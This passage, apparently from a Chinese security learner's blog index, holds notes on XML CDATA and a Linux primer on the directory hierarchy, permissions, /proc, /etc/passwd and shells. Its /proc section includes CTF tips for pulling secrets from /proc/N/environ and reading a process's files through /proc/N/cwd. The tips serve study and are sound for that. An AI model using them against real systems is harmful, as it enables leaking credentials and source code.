Table&lt;/f:name&gt;</span><br><span class="line"> &lt;f:width&gt;80&lt;/f:width&gt;</span><br><span class="line"> &lt;f:length&gt;120&lt;/f:length&gt;</span><br><span class="line"> &lt;/f:table&gt;</span><br><span class="line"> ​</span><br><span class="line"> &lt;/root&gt; </span><br></pre></td></tr></table></figure><h2 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h2><h4 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h4><blockquote><p>被解析的字符数据</p></blockquote><p>XML 文档中的所有文本均会被解析器解析。</p><p>(当某个元素被解析时，它里面的文本一起被解析【可能有子元素在里面】)</p><p>只有 CDATA 区段中的文本会被解析器忽略。</p><h4 id="CDATA-1"><a href="#CDATA-1" class="headerlink" title="CDATA"></a>CDATA</h4><blockquote><p>（未解析）字符数据</p></blockquote><p>为什么设置CDATA?因为有一些特殊字符【&lt; &gt; &amp;】被解析之后可能破坏xml的格式,发生错误。而某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</p><h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h6><p>CDATA 部分由 “<strong>&lt;![CDATA[**” 开始，由 “**]]&gt;</strong>“ 结束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> function matchwo(a,b)</span><br><span class="line"> &#123;</span><br><span class="line"> if (a &lt; b &amp;&amp; a &lt; 0) then</span><br><span class="line"> &#123;</span><br><span class="line"> return 1;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> return 0;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ]]&gt;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux</title>
      <link href="/2023/05/14/linux/"/>
      <url>/2023/05/14/linux/</url>
      
        <content type="html"><![CDATA[<h2 id="linux介绍"><a href="#linux介绍" class="headerlink" title="linux介绍"></a>linux介绍</h2><p>Linux，全称GNU&#x2F;Linux，是一种<strong>免费</strong>使用和自由传播的<strong>类UNIX操作系统</strong>，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版，如基于社区开发的debian、archlinux，和基于商业开发的Red Hat Enterprise Linux、SUSE、Oracle Linux等。</p><p>主要用于服务器端，嵌入式开发（占用内存少）</p><h2 id="文件系统的层次结构"><a href="#文件系统的层次结构" class="headerlink" title="文件系统的层次结构"></a>文件系统的层次结构</h2><p>文件系统的最顶层是由根目录开始的，系统使用“**&#x2F;<strong>”来表示</strong>根目录**，在根目录之下的既可以是目录，也可以是文件，而每一个目录中又可以包含（子）目录或文件。如此反复就可以构成一个庞大的文件系统。</p><p>为了避免诸多Linux发行版使用各部相同的文件系统结构，Linux基金会发布了<strong>FHS</strong>标准，多数Linux发行版系统都遵循这一标准。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1024x719.png" style="zoom:67%;" /><p><strong>FHS认为根目录(&#x2F;)下应该包含如下子目录</strong></p><p>（官方）</p><p>目录</p><p>应放置档案内容</p><p>&#x2F;bin</p><p>系统有很多放置执行档的目录，但&#x2F;bin比较特殊。因为&#x2F;bin放置的是在单人维护模式下还能够被操作的<strong>指令</strong>。在&#x2F;bin底下的指令可以被root与一般帐号所使用，主要有：cat,chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。</p><p>&#x2F;boot</p><p>主要放置<strong>开机</strong>会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在&#x2F;boot&#x2F;grub&#x2F;这个目录。</p><p>&#x2F;dev</p><p>（device）在Linux系统上，任何<strong>装置与周边设备</strong>都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有&#x2F;dev&#x2F;null, &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;tty , &#x2F;dev&#x2F;lp_, &#x2F; dev&#x2F;hd_, &#x2F;dev&#x2F;sd*等等</p><p>&#x2F;etc***</p><p>系统主要的<strong>设定档</strong>几乎都放置在这个目录内，例如<strong>人员的帐号密码档、各种服务的启始档</strong>等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有：&#x2F;etc&#x2F;inittab, &#x2F;etc&#x2F;init.d&#x2F;, &#x2F;etc&#x2F;modprobe.conf, &#x2F;etc&#x2F;X11&#x2F;, &#x2F;etc&#x2F;fstab, &#x2F;etc&#x2F;sysconfig&#x2F;等等。 另外，其下重要的目录有：**&#x2F;etc&#x2F;init.d&#x2F;** ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话： &#x2F;etc&#x2F;init.d&#x2F;iptables start、&#x2F;etc&#x2F;init.d&#x2F; iptables stop &#x2F;etc&#x2F;xinetd.d&#x2F; ：这就是所谓的super daemon管理的各项服务的设定档目录。 &#x2F;etc&#x2F;X11&#x2F; ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。（配置信息）</p><p>&#x2F;home</p><p>这是系统预设的使用者<strong>家目录</strong>(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录。</p><p>&#x2F;lib</p><p>系统的函式库非常的多，而&#x2F;lib放置的则是在<strong>开机时会用到的函式库</strong>，以及在&#x2F;bin或&#x2F;sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？妳可以将他想成是外挂，某些指令必须要有这些外挂才能够顺利完成程式的执行之意。 尤其重要的是&#x2F;lib&#x2F;modules&#x2F;这个目录，因为该目录会放置核心相关的模组(驱动程式)。</p><p>&#x2F;media</p><p>media是媒体的英文，顾名思义，这个&#x2F;media底下放置的就是<strong>可移除的装置</strong>。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：&#x2F;media&#x2F;floppy, &#x2F;media&#x2F;cdrom等等。</p><p>&#x2F;mnt</p><p>如果妳想要<strong>暂时挂载某些额外的装置</strong>，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与&#x2F;media相同啦。 只是有了&#x2F;media之后，这个目录就用来暂时挂载用了。</p><p>&#x2F;opt</p><p>这个是给<strong>第三方协力软体</strong>放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果你想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在&#x2F;usr&#x2F;local目录下。</p><p>&#x2F;root</p><p>系统管理员(<strong>root)的家目录</strong>。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。</p><p>&#x2F;sbin</p><p>Linux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来设定系统，其他使用者最多只能用来查询而已。放在&#x2F;sbin底下的为开机过程中所需要的，里面<strong>包括了开机、修复、还原系统所需要的指令</strong>。至于某些伺服器软体程式，一般则放置到**&#x2F;usr&#x2F;sbin&#x2F;<strong>当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到</strong>&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;**当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。</p><p>&#x2F;srv</p><p>srv可以视为service的缩写，是一些网路服务启动之后，这些服务所需要取用的<strong>资料目录</strong>。 常见的服务例如WWW, FTP等等。 举例来说，<strong>WWW伺服器需要的网页资料就可以放置在&#x2F;srv&#x2F;www&#x2F;里面。呵呵，看来平时我们编写的代码应该放到这里了。</strong></p><p>&#x2F;tmp</p><p>这是让一般使用者或者是正在执行的程序<strong>暂时放置档案</strong>的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊。 因为FHS甚至建议在开机时，应该要将&#x2F;tmp下的资料都删除。</p><p>还有下面这些</p><p>&#x2F;lost+found</p><p>这个目录是使用标准的ext2&#x2F;ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于&#x2F;disk中，那在这个系统下就会自动产生一个这样的目录&#x2F;disk&#x2F;lost+found</p><p>&#x2F;proc</p><p>这个目录本身是一个<strong>虚拟文件系统</strong>(virtual filesystem)喔。 他放置的资料都是在内存当中，例如系统核心、行程资讯(process)（是进程吗?）、周边装置的状态及网络状态等等。因为这个目录下的资料都是在记忆体（内存）当中，所以本身不占任何硬盘空间。比较重要的档案（目录）例如： &#x2F;proc&#x2F;cpuinfo, &#x2F;proc&#x2F;dma, &#x2F;proc&#x2F;interrupts, &#x2F;proc&#x2F;ioports, &#x2F;proc&#x2F;net&#x2F;*等等。呵呵，是虚拟内存吗[guest]？</p><p>&#x2F;sys</p><p>这个目录其实跟&#x2F;proc非常类似，也是一个<strong>虚拟的档案系统</strong>，主要也是记录与<strong>核心相关的资讯</strong>。 包括目前已载入的核心模组与核心侦测到的硬体装置资讯等等。 这个目录同样不占硬盘容量。</p><p>推荐博客</p><p><a href="https://www.cnblogs.com/silence-hust/p/4319415.html">https://www.cnblogs.com/silence-hust/p/4319415.html</a></p><h2 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h2><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221025215812113.png"></p><p><strong>文件类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> [d]  -&gt; directory  目录</span><br><span class="line"> [-]  -&gt; 文件</span><br><span class="line"> [l]  -&gt; link  连接文档（快捷方式）</span><br><span class="line"> &#123;</span><br><span class="line">     [b]  -&gt; 装置文件里的可供存储的接口设备（可随机存取装置）</span><br><span class="line">     [c]  -&gt; 装置文件里面的串行端口设备，如键盘鼠标（一次性读取装置）</span><br><span class="line"> &#125;  -&gt; 了解即可</span><br></pre></td></tr></table></figure><p><strong>权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> r  -&gt; 读权限  值：4</span><br><span class="line"> w  -&gt; 写权限  值: 2</span><br><span class="line"> x  -&gt; 执行权限 值：1 （对于普通文件代表执行，对于目录文件代表可进入）</span><br><span class="line"> ​</span><br><span class="line"> u  -&gt; user属主访问权限（拥有者）</span><br><span class="line"> g  -&gt; group属组访问权限（和拥有者同组的人）</span><br><span class="line"> 0  -&gt; other其他人访问权限</span><br><span class="line"> ​</span><br><span class="line"> e.g:  drwxrwxr-x</span><br><span class="line">       u  g o</span><br></pre></td></tr></table></figure><h3 id="根目录下所有目录"><a href="#根目录下所有目录" class="headerlink" title="根目录下所有目录"></a>根目录下所有目录</h3><h5 id="bin"><a href="#bin" class="headerlink" title="&#x2F;bin"></a>&#x2F;bin</h5><p>bin是binary的缩写，这个目录存放的都是二进制可执行文件，bin目录放置的是最基本的一些<strong>命令</strong>的可执行文件，比如cp、mv、mkdir、chmod、chown等等。&#x2F;usr下面也有一个&#x2F;bin目录，它里面的文件也是一些命令的可执行文件。</p><p>bin下存放一些普通的基本命令，如ls,chmod等，这些命令在Linux系统里的配置文件脚本里经常用到。也就是主要放置一些系统的必备执行档</p><h5 id="sbin"><a href="#sbin" class="headerlink" title="&#x2F;sbin"></a>&#x2F;sbin</h5><p>s是super user，也就管理员。这个目录和&#x2F;bin目录很像，也存放着一些程序，不过有些程序需要变成管理员才能执行。主要还是放置一些系统管理的必备程式</p><p>&#x2F;sbin 下的命令属于基本的系统命令，如shutdown，reboot，用于启动系统，修复系统</p><h5 id="etc"><a href="#etc" class="headerlink" title="&#x2F;etc ***"></a>&#x2F;etc ***</h5><p>这个目录用来存放所有的系统管理所需要的<strong>配置文件</strong>和子目录</p><h5 id="home"><a href="#home" class="headerlink" title="&#x2F;home"></a>&#x2F;home</h5><p><strong>用户的主目录</strong>，在linux中，每个用户都有一个自己的目录，一般该目录是以用户的账号命名的</p><h5 id="lib"><a href="#lib" class="headerlink" title="&#x2F;lib"></a>&#x2F;lib</h5><p>这个目录里面存放着系统最基本的<strong>动态连接共享库</strong>，其作用类似于Windows里的<strong>DLL</strong>文件。几乎所有的应用程序都需要用到这些共享库。</p><h5 id="lost-found"><a href="#lost-found" class="headerlink" title="&#x2F;lost+found"></a>&#x2F;lost+found</h5><p>这个目录一般情况下是空的，当系统<strong>非法关机</strong>后，这里就存放了一些文件。</p><h5 id="media"><a href="#media" class="headerlink" title="&#x2F;media"></a>&#x2F;media</h5><p>linux系统会自动识别一些设备，例如U盘，光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。</p><h5 id="mnt"><a href="#mnt" class="headerlink" title="&#x2F;mnt"></a>&#x2F;mnt</h5><p>系统提供该目录是为了让用户<strong>临时挂载别的文件系统</strong>的，我们可以将光驱挂载在&#x2F;mnt&#x2F;上，然后进入该目录就可以查看光驱里的内容了。</p><h5 id="opt"><a href="#opt" class="headerlink" title="&#x2F;opt ***"></a>&#x2F;opt ***</h5><p>这个给主机<strong>额外安装软件</strong>所摆放的目录。比如安装一个oracle数据库就可以放到这个目录下。默认是空的。</p><h5 id="proc"><a href="#proc" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h5><p>这个目录是一个虚拟目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<strong>这个目录的内容不在硬盘上而是在内存里</strong></p><h5 id="root"><a href="#root" class="headerlink" title="&#x2F;root"></a>&#x2F;root</h5><p>该目录为系统管理员，也称作超级权限者的用户主目录</p><h5 id="selinux"><a href="#selinux" class="headerlink" title="&#x2F;selinux"></a>&#x2F;selinux</h5><p>这个目录是Redhat&#x2F;centOS所特有的目录，selinux是一个安全机制，类似于Windows的<strong>防火墙</strong>，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p><h5 id="srv"><a href="#srv" class="headerlink" title="&#x2F;srv"></a>&#x2F;srv</h5><p>该目录存放一些服务启动之后需要<strong>提取的数据</strong></p><h5 id="sys"><a href="#sys" class="headerlink" title="&#x2F;sys"></a>&#x2F;sys</h5><p>这是Linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统sysfs</p><h5 id="tmp"><a href="#tmp" class="headerlink" title="&#x2F;tmp"></a>&#x2F;tmp</h5><p>这个目录只用来存放一些<strong>临时文件</strong>的。</p><h5 id="usr"><a href="#usr" class="headerlink" title="&#x2F;usr"></a>&#x2F;usr</h5><p>用户的很多应用程序和文件都放在这个目录下，类似于Windows下的<strong>program files</strong>目录。</p><h6 id="usr-bin"><a href="#usr-bin" class="headerlink" title="&#x2F;usr&#x2F;bin"></a>&#x2F;usr&#x2F;bin</h6><p>系统用户使用的<strong>应用程序</strong></p><p>&#x2F;usr&#x2F;bin存放一些用户命令。</p><p><strong>是你在后期安装的一些软件的运行脚本</strong>。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome_、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb_、wget等。</p><h6 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="&#x2F;usr&#x2F;sbin"></a>&#x2F;usr&#x2F;sbin</h6><p>超级用户使用的比较高级的<strong>管理员程序和系统守护系统</strong>。 &#x2F;usr&#x2F;sbin存放的一些非必须的系统命令</p><p>放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。</p><h6 id="usr-src"><a href="#usr-src" class="headerlink" title="&#x2F;usr&#x2F;src"></a>&#x2F;usr&#x2F;src</h6><p><strong>内核源码</strong>默认的放置位置</p><h5 id="var"><a href="#var" class="headerlink" title="&#x2F;var ***"></a>&#x2F;var ***</h5><p>这个目录中存放着在不断扩充着的东西，我们习惯将那些<strong>经常被修改</strong>的目录放在这个目录下。包括各种<strong>日志文件</strong></p><h3 id="重要目录"><a href="#重要目录" class="headerlink" title="重要目录"></a>重要目录</h3><h4 id="proc-1"><a href="#proc-1" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h4><h5 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h5><p>一种文件系统，一种<strong>伪文件</strong>系统（也即虚拟文件系统）伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p><p>由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的</p><p>用户可以通过这些文件查看有关<strong>系统硬件</strong>及当前正在<strong>运行进程</strong>的信息，甚至可以通过更改其中某些文件来改变<strong>内核</strong>的运行状态。</p><p>还有的是一些以数字命名的目录，它们是<strong>进程目录</strong>(一个目录就是一个进程)。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是<strong>读取进程信息的接口</strong>。而<strong>self</strong>目录则是<strong>读取进程本身</strong>的信息接口，是一个link。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202116575-1024x150.png" style="zoom: 80%;" /><h5 id="各种目录"><a href="#各种目录" class="headerlink" title="各种目录"></a>各种目录</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202241887-1024x78.png"></p><h6 id="proc-cmdline"><a href="#proc-cmdline" class="headerlink" title="&#x2F;proc&#x2F;cmdline"></a>&#x2F;proc&#x2F;<strong>cmdline</strong></h6><p>载入 kernel 时所下达的相关指令与参数！查阅此文件，可了解指令是如何启动的！</p><p>例如：pythonloader.pyc 中间空格被省略掉了，用readline能查看完整的。 此语句意思是用python运行loader.pyc</p><h6 id="proc-N-environ"><a href="#proc-N-environ" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;environ"></a>&#x2F;proc&#x2F;N&#x2F;environ</h6><p>进程环境变量列表（<strong>有些时候一些CTF题会吧重要变量或者值存放在这个目录下</strong>）</p><h6 id="proc-N-exe"><a href="#proc-N-exe" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;exe"></a>&#x2F;proc&#x2F;N&#x2F;<strong>exe</strong></h6><p>exe 是一个指向启动当前进程的<strong>可执行文件（完整路径）</strong>的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</p><h6 id="proc-maps"><a href="#proc-maps" class="headerlink" title="&#x2F;proc&#x2F;maps"></a>&#x2F;proc&#x2F;maps</h6><p>当前进程关联到的每个<strong>可执行文件和库文件</strong>在内存中的映射区域及其访问权限所组成的列表</p><p>找到&#x2F;app后的文件：app.cpython-39-x86_64-linux-gnu.so</p><p>特殊格式： .so结尾，有<strong>版本号信息</strong></p><h6 id="proc-N-fd"><a href="#proc-N-fd" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;fd"></a>&#x2F;proc&#x2F;N&#x2F;fd</h6><p>包含进程相关的所有的<strong>文件描述符</strong></p><h6 id="proc-cpuinfo"><a href="#proc-cpuinfo" class="headerlink" title="&#x2F;proc&#x2F;cpuinfo"></a>&#x2F;proc&#x2F;cpuinfo</h6><p>本机的 <strong>CPU 的相关信息</strong>，包含<strong>频率</strong>、<strong>类型</strong>与<strong>运算功能</strong>等</p><h6 id="proc-modules"><a href="#proc-modules" class="headerlink" title="&#x2F;proc&#x2F;modules"></a>&#x2F;proc&#x2F;modules</h6><p>目前我们的 Linux 已经载入的<strong>模块列表</strong>，也可以想成是驱动程序啦！</p><h6 id="proc-fb"><a href="#proc-fb" class="headerlink" title="&#x2F;proc&#x2F;fb"></a>&#x2F;proc&#x2F;fb</h6><p>帧缓冲设备列表，包括数量和控制它的驱动</p><h6 id="proc-stat"><a href="#proc-stat" class="headerlink" title="&#x2F;proc&#x2F;stat"></a>&#x2F;proc&#x2F;stat</h6><p>系统的一些状态信息，所有的CPU活动信息</p><h6 id="proc-N-cwd"><a href="#proc-N-cwd" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;cwd"></a>&#x2F;proc&#x2F;N&#x2F;cwd</h6><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录</p><p>e.g: app.cpython-39-x86_64-linux-gnu.so</p><p><strong>cat &#x2F;proc&#x2F;N&#x2F;cwd&#x2F;filename</strong></p><p>打开进程当前<strong>运行文件</strong></p><h4 id="etc-1"><a href="#etc-1" class="headerlink" title="&#x2F;etc"></a>&#x2F;etc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #这个目录用来存放所有的系统管理所需要的配置文件和子目录</span><br></pre></td></tr></table></figure><h6 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h6><p>用户数据库，其中的域给出了用户名、真实姓名、家目录、加密的口令和用户的其他信息.</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202509378.png" style="zoom:67%;" /><p>每行用户信息都以**”：”**作为分隔符，划分为7个字段。</p><p>如下图各个字段含义：</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/4b27211904a247f5b42fcb706ddbfb12.jpeg" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &quot;x&quot;：表示此用户设有密码，但不是真正的密码，真正的密码保存在/etc/shadow文件。</span><br><span class="line"> &#x27;UID&#x27;:UID为0就代表这个账号是管理员账号,1-499(系统用户)500-65535（普通用户）</span><br><span class="line"> &#x27;shell&#x27;:shell是Linux的命令解释器，用户和Linux内核之间沟通的桥梁。</span><br><span class="line"> Shell命令解释器的功能就是将用户输入的命令转换成系统可以识别的机器语言。</span><br><span class="line"> 通常情况下，Linux系统默认使用的命令解释器是/bin/bash，当然还有其他命令解释器。</span><br><span class="line"> (命令行解释器是一个单独的软件程序，它可在用户和操作系统之间提供直接的通讯。命令行解释器是解释器的一种，用于对命令行进行解释执行。)</span><br><span class="line"> &#x27;zsh&#x27;:2022更新之后kali采用的shell版本，史称终极shell。（zsh搭配上&quot;oh my zsh&quot;真的好用到爆）</span><br></pre></td></tr></table></figure><h6 id="etc-shells"><a href="#etc-shells" class="headerlink" title="&#x2F;etc&#x2F;shells"></a>&#x2F;etc&#x2F;shells</h6><p>列出可信任的<strong>shell.chsh 命令</strong>允许用户在本文件指定范围内改变登录shell.提供一台机器FTP服务的服务进程ftpd检查用户shell是否列在 &#x2F;etc&#x2F;shells 文件中，如果不是将不允许该用户登录.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 功能：这个文件记录了你当前Linux系统中所支持的shell版本（只是其中的一部分，还有其他shell在别的路径下）</span><br><span class="line"> 作用：系统上合法的shell都要写入到这个文件中。当系统进行某些服务时就能够依据这个文件的记录来进行操作</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225108937-1024x284.png" style="zoom:67%;" /><p>（用的centos所以没有zsh）</p><p>不同的用户登录系统时,系统会给不同的默认shell版本。具体是什么可以在**&#x2F;etc&#x2F;passwd**中看shell一栏</p><p><strong>shell</strong></p><p>Shell是Linux&#x2F;Unix的一个外壳，你理解成衣服也行。它负责<strong>外界与Linux内核的交互</strong>，接收用户或其他应用程序的命令，然后把这些命令转化成内核能理解的语言，传给内核，内核是真正干活的，干完之后再把结果返回用户或应用程序。</p><p><strong>shell版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> sh（Bourne shell）：第一个流行的shell由Steven Bourne发展出来的</span><br><span class="line"> csh（C shell）：由伯克利大学的Bill Joy设计依附于BSD版的UNIX系统中的shell，这个语言有点类似C语言，所以简称csh</span><br><span class="line"> tcsh：整合了csh，提供了更多的功能</span><br><span class="line"> bash：当前Linux版本的shell。这个shell是Bourne shell的增强版本，也是基于GNU的架构下的发展</span><br><span class="line"> 商业上用的K shell，还有TCSH等</span><br></pre></td></tr></table></figure><p><strong>Bash shell的功能</strong>(dd)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 概念：bash是Linux默认的shell，主要兼容与sh</span><br></pre></td></tr></table></figure><p>功能①：历史命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~/.bash_history文件：bash记录了你曾经使用过的命令，不同的用户使用过的历史命令也不同，这些历史命令都记录在自己家目录下的.bash_history文件中</span><br><span class="line"> ~/.bash_history记录的是你上一次登录系统所执行过的命令，而至于这一次所执行过的命令都被缓冲在内存中，当你系统关机/重启后才会更新到~/.bash_history文件中</span><br></pre></td></tr></table></figure><p>功能②：命令与文件补齐功能（tab键）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Linux系统下tab键补齐功能十分好用</span><br><span class="line"> 若安装了bash-completion软件，则在某些命令后面使用Tab按键时，可以进行选项与参数补齐的功能</span><br></pre></td></tr></table></figure><p>功能③：命令别名设置功能（alias）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> alias命令：这个命令可以给命令取别名</span><br></pre></td></tr></table></figure><p>功能④：任务管理、前台、后台控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 任务管理的用途广泛，可以将人物丢到后台运行</span><br><span class="line"> 任务前、后台的控制可以让任务进行的更为顺利</span><br></pre></td></tr></table></figure><p>功能⑤：程序化脚本（shell scripts）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 从前DOS年代需要将一堆命令写在一起来形成批处理文件（编程语言书写）</span><br><span class="line"> 而在Linux系统中，可以通过shell提供的环境变量以及相关命令来设计shell脚本，就能够实现相应的功能</span><br></pre></td></tr></table></figure><p>功能⑥：通配符*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> Linux使用*通配符，使用方便</span><br></pre></td></tr></table></figure><h6 id="etc-group"><a href="#etc-group" class="headerlink" title="&#x2F;etc&#x2F;group"></a>&#x2F;etc&#x2F;group</h6><p>　　类似&#x2F;etc&#x2F;passwd ，但说明的不是用户而是组.</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210139910.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> root:   x  ：   0      ： </span><br><span class="line">                          </span><br><span class="line"> 组名：组密码：组ID（GID）：组中用户</span><br></pre></td></tr></table></figure><h6 id="etc-fstab"><a href="#etc-fstab" class="headerlink" title="&#x2F;etc&#x2F;fstab"></a>&#x2F;etc&#x2F;fstab</h6><p>　　启动时mount -a命令(在&#x2F;etc&#x2F;rc 或等效的启动文件中)自动mount的文件系统列表.<a href="http://lib.csdn.net/base/linux">linux</a>下，也包括用swapon -a启用的swap区的信息.</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210033960-1024x101.png"></p><h6 id="etc-rc-d"><a href="#etc-rc-d" class="headerlink" 